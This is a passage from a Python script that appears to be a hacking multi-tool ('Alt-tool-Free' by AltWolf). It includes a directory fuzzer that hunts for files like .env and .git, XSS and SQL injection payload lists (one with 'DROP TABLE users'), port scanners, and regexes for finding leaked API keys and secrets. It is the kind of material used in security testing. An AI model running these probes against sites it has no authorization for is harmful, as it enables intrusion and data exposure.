            print("\n[+] Comparison complete")
            
        except Exception as e:
            print(f"\n[!] Error: {str(e)}")
        
        input("\nPress ENTER to continue...")


    def main():
        while True:
            clear_screen()
            print_banner()
            print_menu()
            
            choice = get_input("Enter choice")
            
            if choice == '1':
                analyze_single_url()
            elif choice == '2':
                analyze_batch_urls()
            elif choice == '3':
                analyze_file()
            elif choice == '4':
                analyze_directory()
            elif choice == '5':
                compare_urls()
            elif choice == '0':
                print("\n[*] Exiting TECHINT Analyzer...")
                print("[+] Goodbye!\n")
                sys.exit(0)
            else:
                print("\n[!] Invalid choice")
                input("\nPress ENTER to continue...")


    if __name__ == '__main__':
        try:
            main()
        except KeyboardInterrupt:
            print("\n\n[!] Interrupted by user")
            print("[+] Goodbye!\n")
            sys.exit(0)


elif menu_choice == "20":
        os.system('cls' if os.name == 'nt' else 'clear')
        #!/usr/bin/env python3
        import requests
        import threading
        import queue
        import sys
        import time
        from urllib.parse import urljoin
        import os

        requests.packages.urllib3.disable_warnings()

        WORDLIST = ['admin','administrator','api','backup','config','dashboard','dev','login','test','upload',
                    'user','files','data','images','css','js','assets','static','public','private','secret',
                    'hidden','.git','.env','robots.txt','sitemap.xml','phpinfo.php','.htaccess','web.config',
                    'wp-admin','wp-login','phpmyadmin','database','db','sql','uploads','temp','tmp','cache',
                    'logs','log','error','debug','info','status','health','version','api-docs','swagger',
                    'graphql','rest','v1','v2','v3','app','application','backend','frontend','portal',
                    'settings','setup','install','readme','license','config.php','config.json','.gitignore',
                    'package.json','composer.json','Dockerfile','.dockerignore','nginx.conf','apache.conf',
                    'server.js','index.php','index.html','home','main','about','contact','search','profile',
                    'account','user','users','auth','authentication','oauth','token','session','cookie',
                    'media','content','download','export','import','old','new','beta','alpha','prod',
                    'production','staging','development','testing','demo','sample','example','docs',
                    'documentation','help','support','faq','news','blog','forum','shop','store','cart',
                    'checkout','payment','order','invoice','report','analytics','stats','monitoring']

        class Fuzzer:
            def __init__(self, target, threads=50, extensions=None, recursive=False, mode='basic'):
                self.target = target.rstrip('/')
                self.threads = threads
                self.extensions = extensions or []
                self.recursive = recursive
                self.wordlist = WORDLIST if mode == 'basic' else WORDLIST * 2
                self.url_queue = queue.Queue()
                self.found = []
                self.running = True
                self.lock = threading.Lock()
                self.tested = 0
                self.session = requests.Session()
                self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'})

            def test_url(self, url):
                if not self.running:
                    return
                try:
                    r = self.session.get(url, timeout=10, verify=False, allow_redirects=False)
                    with self.lock:
                        self.tested += 1
                    if r.status_code in [200, 201, 204, 301, 302, 307, 308, 401, 403]:
                        result = {'url': url, 'status': r.status_code, 'length': len(r.content)}
                        with self.lock:
                            self.found.append(result)
                        self.print_result(result)
                        if self.recursive and r.status_code in [200, 301, 302] and not url.endswith(tuple(self.extensions)):
                            for word in self.wordlist[:30]:
                                self.url_queue.put(urljoin(url + '/', word))
                except:
                    pass

            def print_result(self, result):
                color = '\033[92m' if result['status'] == 200 else '\033[93m' if result['status'] in [301,302,307,308] else '\033[91m'
                size = f"{result['length']/1024:.1f}KB" if result['length'] > 1024 else f"{result['length']}B"
                print(f"{color}[{result['status']}]\033[0m {result['url']} ({size})")

            def worker(self):
                while self.running:
                    try:
                        url = self.url_queue.get(timeout=1)
                        self.test_url(url)
                        self.url_queue.task_done()
                    except queue.Empty:
                        continue

            def run(self):
                print(f"\n[\033[94m*\033[0m] Target: {self.target}")
                print(f"[\033[94m*\033[0m] Threads: {self.threads}")
                print(f"[\033[94m*\033[0m] Wordlist: {len(self.wordlist)} entries")
                print(f"[\033[94m*\033[0m] Extensions: {', '.join(self.extensions) if self.extensions else 'None'}")
                print(f"[\033[94m*\033[0m] Recursive: {self.recursive}\n")
                
                try:
                    self.session.get(self.target, timeout=10, verify=False)
                    print(f"[\033[92m+\033[0m] Target is reachable\n")
                except:
                    print(f"[\033[91m!\033[0m] Cannot reach target")
                    return

                for word in self.wordlist:
                    self.url_queue.put(urljoin(self.target + '/', word))
                    for ext in self.extensions:
                        if not word.endswith(ext):
                            self.url_queue.put(urljoin(self.target + '/', f"{word}{ext}"))

                start = time.time()
                threads = []
                for _ in range(self.threads):
                    t = threading.Thread(target=self.worker, daemon=True)
                    t.start()
                    threads.append(t)

                try:
                    self.url_queue.join()
                    self.running = False
                    for t in threads:
                        t.join(timeout=1)
                except KeyboardInterrupt:
                    print(f"\n\n[\033[93m!\033[0m] Interrupted")
                    self.running = False

                elapsed = time.time() - start
                print(f"\n[\033[94m*\033[0m] Tested: {self.tested} | Found: {len(self.found)} | Time: {elapsed:.2f}s | Req/s: {self.tested/elapsed:.2f}")

                if self.found:
                    save = input("\n[\033[94m?\033[0m] Save results? (y/n): ")
                    if save.lower() == 'y':
                        filename = input("[\033[94m?\033[0m] Filename: ").strip() or "results.txt"
                        try:
                            with open(filename, 'w') as f:
                                for result in self.found:
                                    f.write(f"[{result['status']}] {result['url']} ({result['length']}B)\n")
                            print(f"[\033[92m+\033[0m] Saved to {filename}")
                        except:
                            print(f"[\033[91m!\033[0m] Failed to save")

        def menu():
            os.system('clear' if os.name != 'nt' else 'cls')
            
            target = input("[\033[94m1\033[0m] Target URL: ").strip()
            if not target:
                print("[\033[91m!\033[0m] Target required")
                return
            if not target.startswith('http'):
                target = 'https://' + target
            
            print("\n[\033[94m2\033[0m] Scan mode:")
            print("  [1] Quick (100 entries)")
            print("  [2] Full (200 entries)")
            mode_choice = input("  Choice (default: 1): ").strip() or '1'
            mode = 'basic' if mode_choice == '1' else 'full'
            
            threads = input(f"\n[\033[94m3\033[0m] Threads (default: 50): ").strip()
            threads = int(threads) if threads and threads.isdigit() else 50
            
            ext_input = input(f"\n[\033[94m4\033[0m] Extensions (e.g., .php,.html or leave empty): ").strip()
            extensions = [e.strip() if e.startswith('.') else f'.{e.strip()}' for e in ext_input.split(',') if e.strip()] if ext_input else []
            
            recursive = input(f"\n[\033[94m5\033[0m] Recursive mode? (y/n, default: n): ").strip().lower() == 'y'
            
            print("\n" + "\033[96m" + "="*60 + "\033[0m")
            confirm = input("[\033[94m?\033[0m] Start fuzzing? (y/n): ").strip().lower()
            
            if confirm == 'y':
                fuzzer = Fuzzer(target, threads, extensions, recursive, mode)
                fuzzer.run()
            else:
                print("[\033[93m!\033[0m] Cancelled")

        if __name__ == '__main__':
            try:
                menu()
            except KeyboardInterrupt:
                print("\n[\033[93m!\033[0m] Exited")
                sys.exit(0)





elif menu_choice == "21":
        os.system('cls' if os.name == 'nt' else 'clear')
        xss = """
             %%%%*               
           -%%%%%%%+             
        :==*%#%%%%#*++=          
           :%*#@#*=.             
           :%##@=-=.             
             %#=---.             
          ===++++-               
          ++++++**+:             
          =++++++++++            
        -++****+++**+            
        =*+****+++*+-            
        =******+++*-             
        =*++***+++*-          
          +++**+++**=        XSS Search By AltWolf    
           :***+++***           Version Free
           :%%%#@@#-             
          ****++**+*+            
          ***+++##**+            
        =**+=++*###*+            
        +**+++*%%%%#*            
     :=*++++*#+:*%%#*            
     #**+++++   =%%#=            
     #*****#*   =%%+             
        +%%:    =%%%#            
        +%%:      *%*            
      .####.      *%*            
      .##*=       *%*            
      .##=        *%*            
      .##=        *%*            
      :%%#+       *%%*=           
        """
        print_violet_white_gradient(xss)
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"'><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<div onmouseover=alert(1)>Hover Me</div>",
            "<input type=text value=\"\"><script>alert(1)</script>",
            "</textarea><script>alert(1)</script>",
            "\";alert(1)//",
            "<img src=x onerror=prompt(1)>",
            "<svg onload=confirm(1)>",
            "javascript:alert(1)",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<style>@import'javascript:alert(1)';</style>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<base href=javascript:alert(1)//>",
            "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">"
        ]

        def test_xss_vulnerability(url, method="GET", data=None):
            vulnerable_count = 0
            safe_count = 0
            
            for payload in xss_payloads:
                try:
                    if method == "GET":
                        test_url = url + "?test=" + payload
                        response = requests.get(test_url, timeout=10)
                    else:
                        response = requests.post(url, data={"test": payload}, timeout=10)
                    
                    if payload in response.text:
                        print(f"[!] Potentially vulnerable with payload: {payload}")
                        vulnerable_count += 1
                    else:
                        safe_count += 1
                
                except requests.exceptions.RequestException as e:
                    print(f"[X] Error with payload: {e}")
            
            return vulnerable_count, safe_count

        def check_get_and_post_xss(url):
            print(f"\nTesting GET parameters for {url}...")
            get_vuln, get_safe = test_xss_vulnerability(url, method="GET")
            
            print(f"\nTesting POST parameters for {url}...")
            post_vuln, post_safe = test_xss_vulnerability(url, method="POST")
            
            total_vuln = get_vuln + post_vuln
            total_safe = get_safe + post_safe
            
            print(f"\n{'='*60}")
            print(f"SCAN RESULTS FOR: {url}")
            print(f"{'='*60}")
            print(f"Total vulnerable payloads: {total_vuln}")
            print(f"Total safe payloads: {total_safe}")
            print(f"{'='*60}\n")

        if __name__ == "__main__":
            target_url = input("Enter website URL to test for XSS vulnerability: ")
            
            if not target_url.startswith("http"):
                target_url = "https://" + target_url
            
            check_get_and_post_xss(target_url)
            
            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")




elif menu_choice == "22":
        os.system('cls' if os.name == 'nt' else 'clear')
        sql = """                       
                 ............                
          ..:--------------------::.         
       .:----:..              ..:-----.      
      :--:.                        .:--:.    
     .--.                             --.    
     .---.                          .:--:    
     .------..                  ..:-----:    
     .--..::---------::::----------:..--:    
     .--.     ...:::::::::::::..      --:    
     .--.                             --:    SQL Search By AltWolf
     .--:.                           :--:       Version Free
     .-----:..                   ..:----:    
     .--..:------:::.......::------:..--:    
     .--.     ..::----------::...     --:    
     .--.                             --:    
     .--:.                           :--:    
     .----::.                    .::----:    
     .--..-----::::........::::-----:.--:    
     .--.    ..::------------::..     --:    
     .--.                             --:    
     .:--.                          .:--.    
       :----:.                  ..----:.     
         .:-------------:----------:.        
              ...::--------::...             
        """
        print_violet_white_gradient(sql)
        def test_sql_injection(url, payloads):
            vulnerable_count = 0
            safe_count = 0
            
            print(f"\nTesting SQL injection on: {url}\n")
            
            for payload in payloads:
                test_url = f"{url}?id={payload}"
                try:
                    response = requests.get(test_url, timeout=10)
                    content = response.text.lower()
                    
                    sql_errors = [
                        "error",
                        "sql syntax",
                        "mysql",
                        "warning",
                        "unclosed quotation",
                        "quoted string",
                        "sql server",
                        "oracle",
                        "postgresql",
                        "sqlite",
                        "database error",
                        "syntax error",
                        "unexpected end",
                        "you have an error"
                    ]
                    
                    if any(error in content for error in sql_errors):
                        print(f"[+] Possible SQL injection detected with payload: {payload}")
                        vulnerable_count += 1
                    else:
                        safe_count += 1
                        
                except requests.RequestException as e:
                    print(f"[X] Error testing payload {payload}: {e}")
            
            print(f"\n{'='*60}")
            print(f"SCAN RESULTS FOR: {url}")
            print(f"{'='*60}")
            print(f"Total vulnerable payloads: {vulnerable_count}")
            print(f"Total safe payloads: {safe_count}")
            print(f"{'='*60}\n")

        if __name__ == "__main__":
            target_url = input("Enter target URL (e.g., http://example.com/page.php): ").strip()
            
            if not target_url.startswith("http"):
                target_url = "https://" + target_url
            
            sql_payloads = [
                "1' OR '1'='1",
                "1' OR '1'='1' --",
                "1' OR '1'='1' /*",
                "1' AND 1=CONVERT(int, (SELECT @@version)) --",
                "1' AND 1=1 --",
                "1' AND 1=2 --",
                "' OR '' = '",
                "1 OR 1=1",
                "admin' --",
                "admin' #",
                "' OR 1=1 --",
                "' OR 'x'='x",
                "1'; DROP TABLE users--",
                "1' UNION SELECT NULL--",
                "1' AND '1'='1",
                "' WAITFOR DELAY '00:00:05'--",
                "1; SELECT * FROM users",
                "' OR '1'='1' ({",
                "1' ORDER BY 1--",
                "1' UNION ALL SELECT NULL,NULL--"
            ]
            
            test_sql_injection(target_url, sql_payloads)
            
            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")



if menu_choice == "23":
            os.system('cls' if os.name == 'nt' else 'clear')
            vuln = """               
             .=*++++*=            
          :+.          :=.        
        .=   .-=-::-=-   .=       
       :-  .+          +   +      
       =  -=            =:  #     
      -:  +              -  -:    
      +  .=              -  .=    
      +  .=              -  .=    
    :=-::::::::::::::::::::::-=.        Vulnerability Search by AltWolf
   -:                          -.                Version Free
   -                           :: 
   -           -=::=:          :: 
   -          :-    =          :: 
   -           =.  -:          :: 
   -           =.  -:          :: 
   -           =   ::          :: 
   -           =   ::          :: 
   -           :-::-.          :: 
   -                           :: 
   :-                          =  
     *************************=   
            """
            print_violet_white_gradient(vuln)
            def check_http_headers(url):
                print(f"Checking HTTP headers for {url}...")
                try:
                    response = requests.get(url, timeout=10)
                    headers = response.headers
                    issues_found = []

                    recommendations = {
                        'Content-Security-Policy': "Mitigates XSS attacks by defining where resources can be loaded from.",
                        'Strict-Transport-Security': "Forces browsers to use HTTPS, preventing MITM attacks.",
                        'X-Content-Type-Options': "Prevents browsers from interpreting files as different MIME types.",
                        'X-Frame-Options': "Protects against clickjacking by controlling iframe embedding.",
                        'X-XSS-Protection': "Enables browser built-in XSS protection.",
                        'Referrer-Policy': "Controls referrer information included with requests.",
                        'Permissions-Policy': "Controls which features and APIs can be used."
                    }

                    for header, recommendation in recommendations.items():
                        if header not in headers:
                            issues_found.append((header, f"Missing: {recommendation}"))

                    return issues_found
                except Exception as e:
                    return [("HTTP Headers", f"Error checking headers: {e}")]

            def check_sensitive_files(url):
                print("Checking for sensitive files...")
                sensitive_files = [
                    'robots.txt', '.git', '.env', '.htaccess', 'config.php',
                    'web.config', '.svn', 'backup.sql', 'phpinfo.php',
                    'admin', 'phpmyadmin', '.DS_Store', 'wp-config.php'
                ]
                issues_found = []

                for file in sensitive_files:
                    file_url = url.rstrip('/') + '/' + file
                    try:
                        response = requests.get(file_url, timeout=5)
                        if response.status_code == 200:
                            issues_found.append((file, f"Sensitive file found: {file_url}"))
                    except:
                        pass

                return issues_found

            def check_for_vulnerabilities(url):
                print(f"Checking for common vulnerabilities on {url}...")
                issues_found = []

                sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]
                for payload in sql_payloads:
                    try:
                        response = requests.get(url, params={"id": payload}, timeout=5)
                        content = response.text.lower()
                        if any(err in content for err in ["mysql", "syntax", "sql", "database error"]):
                            issues_found.append(("SQL Injection", f"Potential vulnerability with payload: {payload}"))
                            break
                    except:
                        pass

                xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
                for payload in xss_payloads:
                    try:
                        response = requests.get(url, params={"q": payload}, timeout=5)
                        if payload in response.text:
                            issues_found.append(("XSS", f"Potential vulnerability with payload: {payload}"))
                            break
                    except:
                        pass

                return issues_found

            def check_open_ports(url):
                print(f"Checking open ports for {url}...")
                issues_found = []
                ports_to_check = [80, 443, 21, 22, 25, 110, 143, 3306, 3389, 8080, 8443, 8888]
                
                try:
                    hostname = url.replace("https://", "").replace("http://", "").split('/')[0]
                    ip = socket.gethostbyname(hostname)

                    for port in ports_to_check:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            result = sock.connect_ex((ip, port))
                            if result == 0:
                                issues_found.append((f"Port {port}", f"Open port found: {port}"))
                            sock.close()
                        except:
                            pass
                except Exception as e:
                    issues_found.append(("Port Scan", f"Error scanning ports: {e}"))

                return issues_found

            def check_ssl_certificate(url):
                print(f"Checking SSL certificate for {url}...")
                issues_found = []
                
                try:
                    hostname = url.replace("https://", "").replace("http://", "").split('/')[0]
                    context = ssl.create_default_context()
                    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
                    conn.settimeout(5.0)
                    conn.connect((hostname, 443))
                    cert = conn.getpeercert()
                    
                    issues_found.append(("SSL Certificate", "SSL certificate is valid"))
                    conn.close()
                    
                except ssl.SSLError as e:
                    issues_found.append(("SSL Certificate", f"SSL error: {e}"))
                except Exception as e:
                    issues_found.append(("SSL Certificate", f"Error checking certificate: {e}"))

                return issues_found

            def main():
                url = input("Enter URL to scan (e.g., https://example.com): ").strip()

                if not url.startswith("http"):
                    url = "https://" + url

                print(f"\nStarting security scan for {url}...\n")
                
                issues = []
                issues.extend(check_http_headers(url))
                issues.extend(check_sensitive_files(url))
                issues.extend(check_for_vulnerabilities(url))
                issues.extend(check_open_ports(url))
                issues.extend(check_ssl_certificate(url))

                print(f"\n{'='*60}")
                print(f"SCAN RESULTS FOR: {url}")
                
                if issues:
                    print(f"Total issues found: {len(issues)}\n")
                    for issue in issues:
                        print(f"[!] {issue[0]}: {issue[1]}")
                else:
                    print("No vulnerabilities found.")
                
                print(f"\n{'='*60}\n")
                
                input("Press enter to continue...")
                time.sleep(1)
                os.system("python Alt-tool-Free.py")

            if __name__ == "__main__":
                main()

if menu_choice == "24":
        os.system('cls' if os.name == 'nt' else 'clear')
        namp = """                                   
                  .+#@@@@@@@@@@@#+.                 
              *@@@@@@@@@@@@@@@@@@@@@@@*             
          .%@@# .%@@#     *    +@@@- .#@@%          
        +@@*   *@@=    -:.#.-*:  :@@#    #@@+       
      +@@-    *@@       .+%-...=-  %@%     =@@=     
     %@+      @@-        .#.:#...=  @@-      +@@       Scanner Web By AltWolf
   =@%       +@%  *..*: +@@#.:*..+  %@%        @@=       Version Free
   -@@       =@%  *..=:.-%@+..+..+  %@#        @@-  
     %@*      @@+  +..=+..#.=+..-- :@@.      *@@    
      =@@=    =@@-  *:...:#....*   @@*     +@@-     
        =@@#   :@@%   -%++%+#=   *@@+    %@@-       
           #@@#. *@@@+    *   =@@@#  :#@@#          
              +%@@@@@@@@@@@@@@@@@%%@@%+             
                   =%@@@@@@@@@@@%=    
        """
        print_violet_white_gradient(namp)
        def get_ports_open(url):
            try:
                parsed_url = urlparse(url)
                host = parsed_url.netloc
                
                if not host:
                    host = url.replace("https://", "").replace("http://", "").split('/')[0]

                ip_address = socket.gethostbyname(host)
                print(f"IP address of {host}: {ip_address}\n")

                common_ports = {
                    21: "FTP",
                    22: "SSH",
                    23: "Telnet",
                    25: "SMTP",
                    53: "DNS",
                    80: "HTTP",
                    110: "POP3",
                    143: "IMAP",
                    443: "HTTPS",
                    3306: "MySQL",
                    3389: "RDP",
                    5432: "PostgreSQL",
                    6379: "Redis",
                    8080: "HTTP Proxy",
                    8443: "HTTPS Alt",
                    27017: "MongoDB"
                }

                open_ports = []
                print("Scanning ports...\n")
                
                for port, service in common_ports.items():
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    sock.close()
                    
                    if result == 0:
                        open_ports.append((port, service))
                        print(f"[+] Port {port} ({service}) is open")

                return open_ports

            except socket.gaierror as e:
                print(f"DNS resolution error: {e}")
                return []
            except socket.error as e:
                print(f"Socket connection error: {e}")
                return []
            except Exception as e:
                print(f"Error: {e}")
                return []

        if __name__ == "__main__":
            url = input("Enter website URL to scan (e.g., https://example.com): ")
            
            if not url.startswith("http"):
                url = "https://" + url

            print(f"\nAnalyzing open ports for {url}...\n")
            open_ports = get_ports_open(url)
            
            print(f"\n{'='*60}")
            if open_ports:
                print(f"Found {len(open_ports)} open port(s) on {url}:\n")
                for port, service in open_ports:
                    print(f"  Port {port} ({service})")
            else:
                print("No open ports found.")
            print(f"{'='*60}\n")
            
            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")



if menu_choice == "25":
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-
    import sys
    import os
    import time
    import requests
    import re
    import urllib.parse
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
    from bs4 import BeautifulSoup
    from colorama import Fore, Style, init
    import json
    from datetime import datetime
    import threading
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import argparse

    init(autoreset=True)
    requests.packages.urllib3.disable_warnings()

    class ScannerConfig:
        def __init__(self):
            self.verbose = False
            self.silent = False
            self.threads = 5
            self.timeout = 10
            self.proxy = None
            self.rate_limit = 0.5
            self.output_format = "txt"
            self.user_agent = "Mozilla/5.0 SecurityScanner/2.0"
            
        def get_proxies(self):
            if self.proxy:
                return {
                    'http': self.proxy,
                    'https': self.proxy
                }
            return None
        
        def get_headers(self):
            return {"User-Agent": self.user_agent}

    config = ScannerConfig()

    class Colors:
        GREEN = "\033[92m"
        RED = "\033[91m"
        YELLOW = "\033[93m"
        BLUE = "\033[94m"
        MAGENTA = "\033[95m"
        CYAN = "\033[96m"
        WHITE = "\033[97m"
        RESET = "\033[0m"

    def print_gradient(text, color1=(128, 0, 128), color2=(255, 255, 255)):
        if len(text) == 0:
            return
        gradient_step = 1.0 / max(len(text) - 1, 1)
        
        for i, char in enumerate(text):
            ratio = i * gradient_step
            r = int(color1[0] * (1 - ratio) + color2[0] * ratio)
            g = int(color1[1] * (1 - ratio) + color2[1] * ratio)
            b = int(color1[2] * (1 - ratio) + color2[2] * ratio)
            sys.stdout.write(f"\033[38;2;{r};{g};{b}m{char}")
        sys.stdout.write("\033[0m\n")

    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner():
        clear_screen()
        banner = """
        ╔══════════════════════════════════════════════════════════════╗
        ║                           AltScan                            ║
        ║                         By AltWolf                           ║
        ╚══════════════════════════════════════════════════════════════╝
        """
        print_gradient(banner, (0, 255, 0), (255, 255, 255))

    def log_message(message, level="INFO"):
        if config.silent:
            return
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if level == "INFO" and not config.verbose:
            return
        
        color_map = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "VULN": Colors.RED
        }
        
        color = color_map.get(level, Colors.WHITE)
        print(f"{Colors.WHITE}[{timestamp}]{Colors.RESET} {color}[{level}]{Colors.RESET} {message}")

    def make_request(url, method="GET", **kwargs):
        time.sleep(config.rate_limit)
        
        kwargs['proxies'] = config.get_proxies()
        kwargs['headers'] = kwargs.get('headers', config.get_headers())
        kwargs['timeout'] = kwargs.get('timeout', config.timeout)
        kwargs['verify'] = False
        
        try:
            if method.upper() == "GET":
                return requests.get(url, **kwargs)
            elif method.upper() == "POST":
                return requests.post(url, **kwargs)
            elif method.upper() == "OPTIONS":
                return requests.options(url, **kwargs)
            elif method.upper() == "HEAD":
                return requests.head(url, **kwargs)
        except Exception as e:
            log_message(f"Erreur requête {url}: {str(e)}", "ERROR")
            return None

    def save_report(scan_name, url, results):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_filename = f"scan_{scan_name}_{timestamp}"
        
        if config.output_format == "txt":
            filename = f"{base_filename}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Scan: {scan_name}\n")
                f.write(f"URL: {url}\n")
                f.write(f"Date: {datetime.now()}\n")
                f.write("="*60 + "\n\n")
                f.write(results)
            print(f"\n{Colors.GREEN}[+] Rapport TXT sauvegardé: {filename}{Colors.RESET}")
        
        elif config.output_format == "json":
            filename = f"{base_filename}.json"
            report_data = {
                "scan_name": scan_name,
                "url": url,
                "timestamp": datetime.now().isoformat(),
                "results": results.split('\n')
            }
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, indent=2, ensure_ascii=False)
            print(f"\n{Colors.GREEN}[+] Rapport JSON sauvegardé: {filename}{Colors.RESET}")
        
        elif config.output_format == "html":
            filename = f"{base_filename}.html"
            html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Rapport de Scan - {scan_name}</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
            .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h1 {{ color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
            .info {{ background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 20px 0; }}
            .vuln {{ background: #e74c3c; color: white; padding: 10px; margin: 10px 0; border-radius: 5px; }}
            .warning {{ background: #f39c12; color: white; padding: 10px; margin: 10px 0; border-radius: 5px; }}
            .success {{ background: #27ae60; color: white; padding: 10px; margin: 10px 0; border-radius: 5px; }}
            pre {{ background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px; overflow-x: auto; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Rapport de Scan de Sécurité</h1>
            <div class="info">
                <strong>Scan:</strong> {scan_name}<br>
                <strong>URL:</strong> {url}<br>
                <strong>Date:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            </div>
            <h2>Résultats</h2>
            <pre>{results}</pre>
        </div>
    </body>
    </html>
    """
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"\n{Colors.GREEN}[+] Rapport HTML sauvegardé: {filename}{Colors.RESET}")


    def scan_traefik_dashboard(url):
        log_message("Scan Traefik Dashboard", "INFO")
        test_paths = ["/dashboard/", "/traefik/", "/traefik/dashboard/", "/api/"]
        results = []
        
        for path in test_paths:
            full_url = url.rstrip("/") + path
            r = make_request(full_url)
            if r and r.status_code == 200 and "traefik" in r.text.lower():
                msg = f"[VULNÉRABLE] Traefik dashboard exposé: {full_url}"
                log_message(msg, "VULN")
                results.append(msg)
            else:
                log_message(f"{full_url} - Protégé", "SUCCESS")
        
        if not results:
            log_message("Aucun dashboard Traefik exposé détecté", "SUCCESS")
        
        return "\n".join(results) if results else "Aucune vulnérabilité détectée"

    def scan_stacktrace(url):
        print(f"\n{Colors.CYAN}[*] Scan Stack Traces{Colors.RESET}")
        test_params = ["?debug=test'", "?error=1", "?test='", "?id='"]
        error_patterns = [
            "stacktrace", "exception", "traceback", "error on line",
            "fatal error", "warning:", "mysql_", "postgresql", "sqlite",
            "syntax error", "undefined variable"
        ]
        results = []
        
        for param in test_params:
            test_url = url + param
            try:
                r = requests.get(test_url, timeout=10, verify=False)
                for pattern in error_patterns:
                    if pattern in r.text.lower():
                        msg = f"[VULNÉRABLE] Stack trace détecté avec {param}: {pattern}"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
                        break
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de stack traces visibles{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune vulnérabilité détectée"

    def scan_js_debug(url):
        print(f"\n{Colors.CYAN}[*] Scan Code Debug JavaScript{Colors.RESET}")
        results = []
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            scripts = [s.get("src") for s in soup.find_all("script") if s.get("src")]
            
            debug_patterns = [
                r"console\.log\(",
                r"console\.debug\(",
                r"debugger;",
                r"alert\(",
                r"//\s*TODO",
                r"//\s*DEBUG",
                r"//\s*FIXME"
            ]
            
            for js_url in scripts:
                if js_url.startswith("/"):
                    js_url = url.rstrip("/") + js_url
                elif not js_url.startswith("http"):
                    js_url = url.rstrip("/") + "/" + js_url.lstrip("/")
                
                try:
                    js_code = requests.get(js_url, timeout=10, verify=False).text
                    for pattern in debug_patterns:
                        if re.search(pattern, js_code, re.IGNORECASE):
                            msg = f"[ALERTE] Code debug trouvé dans: {js_url}"
                            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                            results.append(msg)
                            break
                except:
                    continue
            
            if not results:
                print(f"{Colors.GREEN}[+] Pas de code debug détecté{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur: {str(e)}{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune vulnérabilité détectée"

    def scan_html_comments(url):
        print(f"\n{Colors.CYAN}[*] Scan Commentaires HTML{Colors.RESET}")
        results = []
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            comments = re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)
            
            sensitive_keywords = [
                "password", "user", "admin", "key", "secret", "token",
                "api", "credential", "login", "TODO", "FIXME", "DEBUG"
            ]
            
            for comment in comments:
                comment = comment.strip()
                if len(comment) > 10:
                    for keyword in sensitive_keywords:
                        if keyword.lower() in comment.lower():
                            msg = f"[ALERTE] Commentaire sensible: {comment[:100]}..."
                            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                            results.append(msg)
                            break
            
            if not results:
                print(f"{Colors.GREEN}[+] Pas de commentaires sensibles détectés{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur: {str(e)}{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune information sensible dans les commentaires"

    def scan_js_secrets(url):
        print(f"\n{Colors.CYAN}[*] Scan Secrets JavaScript{Colors.RESET}")
        results = []
        
        secret_patterns = [
            (r"api[_-]?key[\"\']?\s*[:=]\s*[\"\']([^\"\']+)", "API Key"),
            (r"secret[\"\']?\s*[:=]\s*[\"\']([^\"\']+)", "Secret"),
            (r"password[\"\']?\s*[:=]\s*[\"\']([^\"\']+)", "Password"),
            (r"token[\"\']?\s*[:=]\s*[\"\']([^\"\']+)", "Token"),
            (r"aws[_-]?access", "AWS Credentials"),
            (r"sk_live_[a-zA-Z0-9]+", "Stripe Key"),
            (r"AIza[0-9A-Za-z\\-_]{35}", "Google API Key")
        ]
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            scripts = [s.get("src") for s in soup.find_all("script") if s.get("src")]
            
            for src in scripts:
                if "min.js" in src:
                    continue
                    
